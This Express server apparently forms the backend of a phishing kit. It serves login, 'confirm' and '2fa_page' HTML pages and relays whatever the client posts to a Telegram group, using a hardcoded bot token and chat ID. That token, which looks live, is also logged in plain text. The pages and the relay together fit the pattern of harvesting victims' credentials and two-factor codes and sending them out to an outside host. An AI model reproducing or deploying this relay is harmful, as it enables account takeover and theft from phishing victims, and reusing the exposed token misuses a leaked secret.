const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '../public')));

// Telegram configuration
const TELEGRAM_BOT_TOKEN = '7334720914:AAFpOWUSNDUFrbxRPeeAZJC4tF1sUQfPouo';
const TELEGRAM_CHAT_ID = '-1002511800213';
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

// Serve HTML files based on route names
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../public/index.html'));
});

app.get('/confirm', (req, res) => {
    res.sendFile(path.join(__dirname, '../public/confirm.html'));
});

app.get('/2fa_page', (req, res) => {
    res.sendFile(path.join(__dirname, '../public/2fa_page.html'));
});

// POST endpoint for sending Telegram messages
app.post('/api/send-telegram', async (req, res) => {
  try {
    const data = req.body; // Get JSON body from client

    const token = TELEGRAM_BOT_TOKEN;
    const chatId = Number(TELEGRAM_CHAT_ID);
    console.log('Message to send:', data.message);
    console.log('Chat ID:', chatId, 'Type:', typeof chatId);
    console.log('Bot Token:', token);
    
    // First, verify the bot and chat
    try {
      const botInfo = await fetch(`https://api.telegram.org/bot${token}/getMe`);
      const botResult = await botInfo.json();
      console.log('Bot info:', botResult);
      
      if (!botResult.ok) {
        console.error("Bot verification failed:", botResult.description);
        return res.status(500).json({
          error: "Bot verification failed",
          details: botResult.description
        });
      }
    } catch (botErr) {
      console.error('Error verifying bot:', botErr);
      return res.status(500).json({
        error: "Failed to verify bot",
        details: botErr.message
      });
    }

    // Send request to Telegram API
    const telegramResp = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: data.message || ""
      })
    });

    const result = await telegramResp.json();
    console.log('Telegram API response:', result);

    if (!result.ok) {
      console.error("Telegram API error:", result.description);
      return res.status(500).json({
        error: "Failed to send message to Telegcram",
        details: result.description
      });
    } else {
      console.log("Message sent to Telegram successfully!");
      return res.status(200).json({ success: true });
    }

  } catch (err) {
    console.error('Error sending message to Telegram:', err);
    return res.status(500).json({ error: err.message });
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.status(200).json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Catch-all route for any other HTML files in public folder
app.get('/:page', (req, res) => {
    const pageName = req.params.page;
    const htmlPath = path.join(__dirname, '../public', `${pageName}.html`);
    
    // Check if HTML file exists
    if (require('fs').existsSync(htmlPath)) {
        res.sendFile(htmlPath);
    } else {
        res.status(404).send('Page not found');
    }
});

// Start server
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
  console.log(`Telegram endpoint: http://localhost:${PORT}/api/send-telegram`);
  console.log(`Available routes:`);
  console.log(`  - http://localhost:${PORT}/ (index.html)`);
  console.log(`  - http://localhost:${PORT}/confirm (confirm.html)`);
  console.log(`  - http://localhost:${PORT}/2fa_page (2fa_page.html)`);
});

module.exports = app;
